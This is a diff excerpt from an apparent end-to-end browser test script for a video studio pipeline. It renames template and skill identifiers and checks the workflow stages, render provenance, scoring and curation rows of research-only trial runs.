-    if (jobs !== `pack:hermes-designed-explainer@${ver} succeeded ${pageId} pack:hermes-designed-explainer@${ver} ${pageId} true true`) throw new Error(`the html-design jobs are "${jobs}"`);
+    if (jobs !== `pack:designed-explainer@${ver} succeeded ${pageId} pack:designed-explainer@${ver} ${pageId} true true`) throw new Error(`the html-design jobs are "${jobs}"`);
     const rendered = dbValue(`SELECT output->'result'->>'renderer' FROM pipeline_stages WHERE run_id = '${runId}' AND stage = 'render' AND state = 'passed' ORDER BY attempt DESC LIMIT 1`);
     if (rendered !== "html-capture") throw new Error(`the html-design video was rendered by "${rendered}"`);
     // Zero image work for this run.
@@ -2580,7 +2605,7 @@ async function scoreAndDecide(runId, stars, shown) {
     await card.getByTestId("html-design-badge").getByText("Hermes-designed page (research only)", { exact: true }).waitFor();
     await scoreAndDecide(runId, { hook: 3, pacing: 4, legibility: 4, polish: 3, audio: 4 }, "65/100 by the owner");
     const logged = dbValue(`SELECT pack_id || '@' || pack_version || ' ' || coalesce(renderer, '?') || ' ' || coalesce(presentation_score::text, 'none') FROM style_trial_outcomes WHERE run_id = '${runId}'`);
-    if (logged !== `hermes-designed-explainer@${ver} html-capture 65`) throw new Error(`the html-design trial's curation row is "${logged}"`);
+    if (logged !== `designed-explainer@${ver} html-capture 65`) throw new Error(`the html-design trial's curation row is "${logged}"`);
     // Nothing is publishable: no upload or publish stage ever ran for it.
     const published = dbValue(`SELECT count(*) FROM pipeline_stages WHERE run_id = '${runId}' AND stage IN ('upload', 'publish') AND state <> 'skipped'`);
     if (published !== "0") throw new Error(`the html-design run has ${published} upload or publish stage(s)`);
@@ -2592,13 +2617,13 @@ async function scoreAndDecide(runId, stars, shown) {
     console.log(`   html-design: ${[...seen].join(", ")} approved; page asked ${fakeStats.htmlDesignAsks[tag]} times (the fetch page refused); 6 stills; rendered by html-capture`);
   }
 
-  step("hermes-skill research run: /graph from New Video goes idea → research → script → skill brief → voice → Hermes render → qc; no assets stage, no image asks, the brief reaches Hermes");
+  step("hermes-skill research run: /dan-koe from New Video goes idea → research → script → skill brief → voice → Hermes render → qc; no assets stage, no image asks, the brief reaches Hermes");
   if (dbValue("SELECT 1") === null) console.log("   no database access (UI_DB unset): the hermes-skill run is skipped");
   else {
     const brief = "Skill brief trial: money that compounds";
     const imagesBefore = imageAskTotal();
     const rendersBefore = fakeStats.renderRequests.length;
-    const runId = await startFromNewVideo("tpl-hermes-graph", brief, "Workflow: Hermes skill (research only, no pictures): Idea → Research → Script → Skill brief → Voice → Video → Quality check");
+    const runId = await startFromNewVideo("tpl-branching-lines", brief, "Workflow: Hermes skill (research only, no pictures): Idea → Research → Script → Skill brief → Voice → Video → Quality check");
     const flow = dbValue(`SELECT (config->'workflow'->>'recipe') || ' ' || (config->'workflow'->'stages')::text FROM pipeline_runs WHERE id = '${runId}'`);
     if (flow !== 'hermes-skill ["idea", "research", "script", "skill-brief", "voice", "render", "qc"]') throw new Error(`the hermes-skill run stored the workflow "${flow}"`);
     let briefCard = false;
@@ -2608,12 +2633,12 @@ async function scoreAndDecide(runId, stars, shown) {
       await card.getByTestId("skill-brief-card").waitFor();
       const lines = await card.getByTestId("skill-brief-list").getByTestId("plan-line").allInnerTexts();
       if (lines.length < 3 || !lines.every((l) => / Spec: \{"label":"Savings"/.test(l))) throw new Error(`the skill brief card does not list a spec per shot: ${lines.join(" | ")}`);
-      await card.getByTestId("plan-note").getByText(/^For \/graph, one spec per shot; the run's narration is the audio\./).waitFor();
+      await card.getByTestId("plan-note").getByText(/^For \/dan-koe, one spec per shot; the run's narration is the audio\./).waitFor();
       if (await card.getByTestId("asset-grid").count()) throw new Error("the skill brief card shows an image grid");
     });
     if (!briefCard) throw new Error(`the skill brief never asked the owner (cards seen: ${[...seen].join(", ")}), though the pack's workflow reviews it every time`);
-    // The render request of this run: the only /graph render with a brief (the earlier /graph batch runs reused a storyboard).
-    const asked = fakeStats.renderRequests.slice(rendersBefore).filter((r) => r.skill === "/graph" && r.briefShots > 0);
+    // The render request of this run: the only /dan-koe render with a brief (the earlier batch runs reused a storyboard).
+    const asked = fakeStats.renderRequests.slice(rendersBefore).filter((r) => r.skill === "/dan-koe" && r.briefShots > 0);
     if (asked.length !== 1 || asked[0].briefShots < 3 || !asked[0].briefMarker || asked[0].pictures !== 0 || !asked[0].noPictureLine) {
       throw new Error(`the Hermes render of the hermes-skill run did not carry its brief: ${JSON.stringify(fakeStats.renderRequests.slice(rendersBefore))}`);
     }
@@ -2625,12 +2650,12 @@ async function scoreAndDecide(runId, stars, shown) {
     if (fakeStats.imageAsksByBrief[tag] || fakeStats.storyboardAsksByBrief[tag]) throw new Error(`the hermes-skill run asked for ${fakeStats.imageAsksByBrief[tag] ?? 0} image(s) and ${fakeStats.storyboardAsksByBrief[tag] ?? 0} storyboard(s)`);
     console.log(`   image asks while the hermes-skill run ran, any run: ${imageAskTotal() - imagesBefore}`);
     const prov = hermesMuxFacts(runId, "the hermes-skill render").pictureLicense;
-    if (!/^hermes-render \/graph .*from this run's skill brief and narration\. Research only/.test(prov)) throw new Error(`the hermes-skill render's picture provenance is "${prov}"`);
+    if (!/^hermes-render \/dan-koe .*from this run's skill brief and narration\. Research only/.test(prov)) throw new Error(`the hermes-skill render's picture provenance is "${prov}"`);
     const card = cardOf(runId, "qc").first();
     await card.getByTestId("hermes-render-badge").getByText("Hermes render (research only)", { exact: true }).waitFor();
     await scoreAndDecide(runId, { hook: 3, pacing: 4, legibility: 4, polish: 3, audio: 3 }, "60/100 by the owner");
     const logged = dbValue(`SELECT pack_id || '@' || pack_version || ' ' || coalesce(renderer, '?') FROM style_trial_outcomes WHERE run_id = '${runId}'`);
-    if (logged !== `hermes-graph@${packVersion("hermes-graph")} hermes`) throw new Error(`the hermes-skill trial's curation row is "${logged}"`);
+    if (logged !== `branching-lines@${packVersion("branching-lines")} hermes`) throw new Error(`the hermes-skill trial's curation row is "${logged}"`);
     await page.goto(`${APP}/studio/runs/${runId}`);
     await page.locator('[data-testid="run-workflow"][data-recipe="hermes-skill"]').locator('[data-testid="workflow-step-skill-brief"][data-state="passed"]').waitFor();
     if (await page.getByTestId("stage-assets").count()) throw new Error("the hermes-skill run page shows an assets stage");
